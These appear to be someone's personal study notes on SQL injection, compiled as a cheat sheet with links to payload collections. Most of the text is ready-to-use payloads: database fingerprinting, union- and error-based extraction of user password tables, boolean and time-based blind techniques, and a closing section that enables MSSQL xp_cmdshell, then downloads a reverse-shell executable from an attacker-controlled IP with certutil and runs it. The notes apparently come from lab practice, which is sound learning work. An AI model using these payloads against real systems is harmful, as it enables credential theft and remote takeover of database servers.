
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi

### Finding stuff in different SQL versions

#### SQL version
Oracle           `SELECT banner FROM v$version SELECT version FROM v$instance`
MSSQL         `SELECT @@version`
PostgreSQL   `SELECT version()`
MySQL          `SELECT @@version`
SQLite           `SELECT sqlite_version()`
#### Database name
PostgreSQL   `SELECT current_database()`
MSSQL          `SELECT db_name()`
MySQL          `SELECT db_name()`


#### More Help
https://portswigger.net/web-security/sql-injection/cheat-sheet
Postgre: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
MSSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
even more https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
Tibs site: https://tib3rius.com/sqli

### Basics

id=`2;--`
`' OR 1=1 -- -` obs, not safe as all rows are returned/possibly updated

`something we know works' AND 1=1 --` safer alternative


## Three types
- In-Band - same method to retrieve results
	- Error-Based - errors shown on web page
	- Union-Based
- Blind
- Out-of-Band

## In-Band SQLi

In-Band = the same method of communication used to exploit the vulnerability and receive the results

### Error-Based

Error-Based = the sql errors shown on web page

try adding ' or " to produce an error

##### Boolean - Internal server error


##### Using conversion errors to get output

We can use error messages like
![[Images/Pasted image 20240903141047.png]]
We got this be injecting into a vulnerable spot, in this case the TrackingID cookie:
`Cookie: TrackingId='||CAST((SELECT password FROM users limit 1) AS int) --; session=8U6gCmtdwVmleBFAYhXe7mZwKiMkyUkh`
We did havet to remove the full actual tracking id since we couldn't input a lot of chars.
![[Images/Pasted image 20240903141338.png]]
Obs that we can see the query too.
### Union-Based

Union-Based = uses select union queries

union: Combines several select statements
- results must have the <u>same number of columns</u>
- the data needs to have a similar data type.

##### Get number of columns in the current table

try:
`0 union select 1`
`0 union select 1,2`
`0 union select 1,2,3`
until you find the right number of columns

(to be compatible with all databases and datatypes NULL can be used instead of numbers - Ex `somthing' union select NULL, NULL`
obs that this could result in errors depending on the use of the data as the returning values will be NULL - Ex `NullPointerException`)

to get rid of the rest of the query (like a password after a username) you can add `--` to the end like:
`0 union select 1,2,3 --` (in mysql a space is required after `--` so I use `-- -` or use `#` for commenting)

in **Oracle** the FROM keyword is required in a query and there's a special built in table called **dual** that can be used:
`' UNION SELECT NULL FROM DUAL--`

also make sure `0` does not return actual results or you will only see these since that would block the new data if we only can see one result

observe that 0 is specific for an int type and for a string probably would be replaced by `'`

we can also use
`0 order by 1`
`0 order by 2`
`0 order by 3`
until we get an error/not normally functioning page to find the number of columns

##### Get datatype of columns in the current table

we want a string type for easy output of data from the database

to find one we can use the same method:
`' UNION SELECT 'a',NULL,NULL,NULL--`
`' UNION SELECT NULL,'a',NULL,NULL--`
`' UNION SELECT NULL,NULL,'a',NULL--`
`' UNION SELECT NULL,NULL,NULL,'a'--`

##### Get database, tables... information

then try to get information about the database:
`0 union select 1,2,database()`   get database name
`?category=qwe' union select null, db_name() -- -`

<u>list tables</u> in the database `sqli_one`
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
`' union select null, table_name from information_schema.tables -- -` (not setting database name)
`' union select null, table_name from information_schema.tables where table_schema='public' -- -` Postgre
observe the `table_schema='public'` - Test this on other
also test `sql select * from information_schema.tables where table_schema not in ('information_schema', 'pg_catalog')`

<u>list columns</u> in the table `staff_users`
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

<u>list the contents</u> of the table `staff_users`
`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
`' union select username, password from users --` (table is already outputted here so don't need to mess with concating strings)
`bad_data' union select null, username||' - '||password from users --` **Oracle**

group_concat()


### Blind SQLi

#### Authentication example

`select * from users where username='%username%' and password='%password%' LIMIT 1;`

`' OR 1=1;--`

#### Boolean based

a create new account form usually check if the username already exists - we can use this to get other information from the database

imagine the sql being:
`select * from users where username = '%username%' LIMIT 1;`
and the check in the background testing if the query failed or succeeded

then we should use this test for true (data returned from the sql statement) or false = no data, an error?, any error?

if we use a non existent username with a union select + something we want to know if it's returning something

`admin123' UNION SELECT 1;--` gives false, since wrong number of columns
`admin123' UNION SELECT 1,2,3;--` gives true

<u>get database name</u>
`admin123' UNION SELECT 1,2,3 where database() like '%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 's%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 'sq%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 'sqw%';--`  false
`admin123' UNION SELECT 1,2,3 where database() like 'sql%';--`  true

<u>get table name</u>
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'user%';--`

confirm you get the correct name by skipping the like bit like this:
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

<u>get column name</u>
`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

to not get the same hit twice what automating:
`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

<u>get data</u> like username and password
`admin123' UNION SELECT 1,2,3 from users where username like 'a%`
`admin123' UNION SELECT 1,2,3 from users where username like 'ad%`

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '38%`

#### Time-based

we're getting no output, even true/false, so we delay instead

`admin123' UNION SELECT sleep(5);--` gives no delay, since wrong number of columns
`admin123' UNION SELECT sleep(5),2;--` gives a five sec delay since the table has two columns

We can use all of the same queries as with boolean, only adding sleep(n) as one of the column representations

### Out-of-Band

the data collection method is something totally different than the one launching the attack
for example it can be sent to a http/dns server you control






### Stacked Queries

not available in all systems

`' ; new query here; --`

# Stored procedures and functions

Procedures and functions within a  database  management system.

MSSQL has **xp_cmdshell** that might be used to execute os calls to get rce (remote code execution). (By using EXECUTE  / EXEC to run windows shell commands!!)

Disabled by default! Still common irl. New secure replacement fir example SSIS (SQL Server Integration Services).
Even when disabled, it can be enabled with an EXEC query if the user has the 'sysadmin' role or have the 'alter settings' server level permission.
`'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`

# Upload and execute exploit/rev shell

`'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.18.21.236:8000/win64-reverse.exe C:\Windows\Temp\reverse.exe'; --`
`'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`


